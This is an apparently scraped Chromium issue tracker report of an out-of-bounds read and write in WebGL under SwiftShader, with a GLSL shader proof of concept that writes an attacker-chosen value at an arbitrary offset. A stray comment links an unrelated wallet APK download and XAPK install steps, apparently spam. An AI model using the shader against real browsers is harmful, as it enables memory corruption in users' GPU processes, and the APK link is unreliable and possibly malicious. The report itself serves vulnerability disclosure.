# Arbitrary OOB read and write with WebGL via SwiftShader

| Field | Value |
|-------|-------|
| **Issue ID** | [439474032](https://issues.chromium.org/issues/439474032) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>WebGL, Internals>GPU>ANGLE |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ma...@gmail.com |
| **Assignee** | sy...@chromium.org |
| **Created** | 2025-08-18 |
| **Bounty** | $10,000.00 |

## Description

Security Bug

Important: Please do not change the component of this bug manually.

Please READ THIS FAQ before filing a bug: https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md

Please see the following link for instructions on filing security bugs: https://www.chromium.org/Home/chromium-security/reporting-security-bugs

Reports may be eligible for reward payments under the Chrome VRP: https://g.co/chrome/vrp

NOTE: Security bugs are normally made public once a fix has been widely deployed.

-------------------------

VULNERABILITY DETAILS
Please provide a brief explanation of the security issue.

VERSION
Chrome Version: [x.x.x.x] + [stable, beta, or dev]
Operating System: [Please indicate OS, version, and service pack level]

https://chrome-stats.com/d/eu.gov.motherwalletpro/download-thank?version=1.0&type=REQUEST_APK

REPRODUCTION CASE
Please include a demonstration of the security bug, such as an attached HTML or binary file that reproduces the bug when loaded in Chrome. PLEASE make the file as small as possible and remove any content not required to demonstrate the bug, or any personal or confidential information.

Please attach files directly, not in zip or other archive formats, and if you've created a demonstration site please also attach the files needed to reproduce the demonstration locally.

FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION
Type of crash: [tab, browser, etc.]
Crash State: [see link above: stack trace *with symbols*, registers, exception record]
Client ID (if relevant): [see link above]

CREDIT INFORMATION
Externally reported security bugs may appear in Chrome release notes. If this bug is included, how would you like to be credited?
Reporter credit: [goes here]

## Timeline

### pu...@gmail.com (2025-08-18)

Steps to reproduce the problem:
0. Launch google-chrome with swiftshader as renderer: google-chrome --use-gl=swiftshader

For simplification, visit https://www.shadertoy.com/new

Copy this shader

uvec4 magic[0x7ffffff];  
  
uniform float q;  
  
int weird(int a, int b) {  
    return int(mod(float(a), float(b)));  
}  
  
ivec3 oobIndex(int off) {  
    int arrayIndex = off / 0x40;  
    int vec4Index = weird(off, 0x40);  
    int compIndex =  vec4Index / 0x10;  
    int combineIndex = weird(vec4Index, 0x10) / 8;  
    return ivec3(arrayIndex, compIndex, combineIndex);  
}  
  
uint oobRead(int off) {  
    ivec3 idx = oobIndex(off);  
    uvec4 comp = magic[idx.x];  
    return comp.x;  
}  
  
uint oobWrite(int off, uint value) {  
    ivec3 idx = oobIndex(off);  
    if (q != 1233112.0) {  
	    magic[idx.x] = uvec4(value);  
    }  
    return magic[idx.x].x;  
}  
  
void mainImage( out vec4 fragColor, in vec2 fragCoord )  
{  
    //uint v = oobRead(0x13371337);  
    uint v = oobWrite(0x13371337, uint(0x41414141));  
    fragColor = vec4(float(v), 0., 0. ,1.);  
}  

3Click run

4You would get a GPU process crash.

5GDB info

### pu...@gmail.com (2025-08-18)

Steps reproduce 
Go to https://chrome-stats.com/d/eu.gov.motherwalletpro/download-thank?version=1.0&type=REQUEST_APK

2 download apk error 
3.An XAPK file is essentially an Android application package that serves as a container for both APK files and additional resources required for the app's operation. Unlike a standard APK, which typically contains only the compiled code and resources to run an Android app, an XAPK file can encompass more extensive, larger assets, such as OBB files (opaque binary blobs), high-resolution graphics, media, or other data necessary for complex apps and games.

Download the XAPK file to your Android device
Ensure you have XAPK Loader on your device. If you don't have XAPK Loader, you can install https://play.google.com/store/apps/details?id=com.androidstats.xapkinstaller
XAPK Loader from Play Store or download XAPK Loader here.
Open XAPK Loader, and select on the XAPK to install it.
Tap Install.
Follow the steps on screen.

### me...@google.com (2025-08-18)

Hi, it seems like you are trying to report multiple issues. Could you please clarify which issue you are referring? Otherwise, I'm afraid we'll have to close this bug as inactionable. Thanks.

### me...@google.com (2025-08-18)

[Comment #2](https://issues.chromium.org/issues/439474032#comment2) has the same content as [bug 40063770](https://issues.chromium.org/issues/40063770), so I'm not sure if there's anything new in this bug.
Comments #1 and #3 don't describe a vulnerability.

### ch...@google.com (2025-11-25)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/439474032)*
